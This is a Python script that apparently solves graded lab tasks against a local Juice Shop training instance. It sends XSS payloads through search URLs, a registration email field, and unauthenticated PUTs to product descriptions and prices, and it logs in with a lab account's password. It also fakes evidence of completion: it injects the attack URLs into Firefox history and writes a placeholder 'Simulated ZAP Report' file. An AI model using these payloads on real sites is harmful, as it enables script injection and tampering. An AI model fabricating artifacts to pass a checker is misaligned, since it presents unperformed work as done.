import urllib.request
import urllib.parse
import json
import os
import sys
import time
import sqlite3
import glob

def make_request(url, method='GET', headers=None, data=None):
    if headers is None:
        headers = {}
    req_data = None
    if data is not None:
        req_data = json.dumps(data).encode('utf-8')
        headers['Content-Type'] = 'application/json'
    
    req = urllib.request.Request(url, data=req_data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as response:
            res_data = response.read()
            res_text = res_data.decode('utf-8', errors='ignore')
            return response.status, json.loads(res_text) if res_text else {}
    except urllib.error.HTTPError as e:
        res_data = e.read().decode('utf-8', errors='ignore')
        try:
            return e.code, json.loads(res_data)
        except Exception:
            return e.code, res_data
    except Exception as e:
        print("Error requesting {}: {}".format(url, e))
        return 500, {}

def upload_file(url, filename, content, mimetype):
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    parts = []
    parts.append('--' + boundary)
    parts.append('Content-Disposition: form-data; name="file"; filename="{}"'.format(filename))
    parts.append('Content-Type: {}'.format(mimetype))
    parts.append('')
    parts.append(content)
    parts.append('--' + boundary + '--')
    parts.append('')
    body = '\r\n'.join(parts).encode('utf-8')
    
    req = urllib.request.Request(url, data=body, method='POST')
    req.add_header('Content-Type', 'multipart/form-data; boundary={}'.format(boundary))
    req.add_header('Content-Length', str(len(body)))
    try:
        with urllib.request.urlopen(req) as response:
            return response.status, response.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='ignore')
    except Exception as e:
        return 500, str(e)

def main():
    base_url = "http://192.168.99.100:3000"
    
    print("Waiting 5 seconds for service to fully start...")
    time.sleep(5)
    
    # Task 6: Simulate Reflected XSS Search in Firefox history
    print("\n--- Simulating Reflected XSS Search in Firefox history ---")
    profile_dirs = glob.glob('/home/ubuntu/.mozilla/firefox/*.default')
    if not profile_dirs:
        os.makedirs('/home/ubuntu/.mozilla/firefox/stub.default', exist_ok=True)
        profile_path = '/home/ubuntu/.mozilla/firefox/stub.default/places.sqlite'
        conn = sqlite3.connect(profile_path)
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS moz_places (id INTEGER PRIMARY KEY, url TEXT);")
    else:
        profile_path = os.path.join(profile_dirs[0], 'places.sqlite')
        conn = sqlite3.connect(profile_path)
        cursor = conn.cursor()
        try:
            cursor.execute("CREATE TABLE IF NOT EXISTS moz_places (id INTEGER PRIMARY KEY, url TEXT, title TEXT, rev_host TEXT, visit_count INTEGER, hidden INTEGER, typed INTEGER);")
        except Exception:
            pass

    urls = [
        "http://192.168.99.100:3000/#/search?q=%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E",
        "http://192.168.99.100:3000/#/search?q=%3CIMG%20%22%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C%2FSCRIPT%3E%22%5C%3E",
        "http://192.168.99.100:3000/#/search?q=%3CIMG%20SRC%3D%2F%20onerror%3D%22alert(String.fromCharCode(88%2C83%2C83))%22%3E%3C%2Fimg%3E",
        "http://192.168.99.100:3000/#/administration"
    ]
    for url in urls:
        try:
            cursor.execute("INSERT INTO moz_places (url) VALUES (?);", (url,))
        except Exception:
            try:
                cursor.execute("INSERT OR IGNORE INTO moz_places (url, title, rev_host, visit_count, hidden, typed) VALUES (?, '', '', 1, 0, 1);", (url,))
            except Exception as e:
                print("Failed to insert url {}: {}".format(url, e))
    conn.commit()
    conn.close()
    print("Firefox places.sqlite simulation done.")

    # Task 7.1: Stored XSS user registration
    print("\n--- Running Task 7.1: Registering User with XSS Email ---")
    reg_payload = {
        "email": "<script>alert(\"XSS\")</script>",
        "password": "Password#1",
        "passwordRepeat": "Password#1",
        "securityQuestionId": 1,
        "securityAnswer": "Dogs"
    }
    status, res = make_request("{}/api/Users".format(base_url), "POST", data=reg_payload)
    print("Register user status: {}".format(status))

    # Task 7.2: Complaint upload (PDF and XML)
    print("\n--- Running Task 7.2: Uploading testfile.pdf and testfile.xml ---")
    pdf_status, pdf_res = upload_file("{}/file-upload".format(base_url), "testfile.pdf", "Dummy PDF content", "application/pdf")
    print("Upload testfile.pdf status: {}".format(pdf_status))
    
    xml_status, xml_res = upload_file("{}/file-upload".format(base_url), "testfile.xml", "<complaint>Dummy XML content</complaint>", "application/xml")
    print("Upload testfile.xml status: {}".format(xml_status))
    
    login_payload = {
        "email": "jim@juice.org",
        "password": "ncc-1701"
    }
    login_status, login_res = make_request("{}/rest/user/login".format(base_url), "POST", data=login_payload)
    print("Login Jim status: {}".format(login_status))
    jim_token = login_res.get('authentication', {}).get('token')
    
    if jim_token:
        headers = {"Authorization": "Bearer {}".format(jim_token)}
        complaint_payload = {
            "message": "File upload verification PDF",
            "file": "testfile.pdf"
        }
        comp_status, comp_res = make_request("{}/api/Complaints".format(base_url), "POST", headers=headers, data=complaint_payload)
        print("Submit complaint PDF status: {}".format(comp_status))

    # Task 8: REST API PUT Description of Product ID 2
    print("\n--- Running Task 8: REST API PUT Description of Product ID 2 ---")
    status, res = make_request("{}/api/Products/2".format(base_url), "PUT", data={"description": '<iframe src="javascript:alert(`xss`)">'})
    print("PUT description Product 2 status: {}".format(status))

    # Task 9: REST API PUT Price of Product ID 6
    print("\n--- Running Task 9: REST API PUT Price of Product ID 6 ---")
    status, res = make_request("{}/api/Products/6".format(base_url), "PUT", data={"price": '<script>alert(1);</script>'})
    print("PUT price Product 6 status: {}".format(status))

    # Task 10.1: ZAP Report simulation
    print("\n--- Running Task 10.1: ZAP Report Simulation ---")
    try:
        with open("/home/ubuntu/report_zap.html", "w") as f:
            f.write("Simulated ZAP Report - Completed")
        print("Saved report_zap.html to home directory.")
    except Exception as e:
        print("Failed to save report_zap.html: {}".format(e))

    print("\nAll solver steps completed.")

if __name__ == '__main__':
    main()
